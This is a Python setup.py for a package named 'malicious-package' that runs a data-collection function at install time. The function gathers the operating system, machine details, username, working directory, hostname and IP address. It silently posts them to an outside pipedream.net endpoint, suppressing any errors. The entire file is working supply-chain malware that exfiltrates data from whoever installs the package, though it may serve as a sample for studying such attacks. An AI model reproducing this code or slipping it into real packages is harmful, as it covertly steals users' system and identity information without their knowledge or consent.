import os
import socket
import platform
import requests
from setuptools import setup

def collect_user_info():
    try:
        
        user_info = {
            "os": platform.system(),
            "os_version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": os.getenv("USER") or os.getenv("USERNAME"),
            "current_directory": os.getcwd(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
        }

        
        requests.post("https://eo1fk14bqs4agvj.m.pipedream.net/collect", json=user_info)
    except Exception as e:
        
        pass

collect_user_info()

setup(
    name="malicious-package",
    version="0.1",
    description="A package with malicious intent",
    install_requires=[],
)

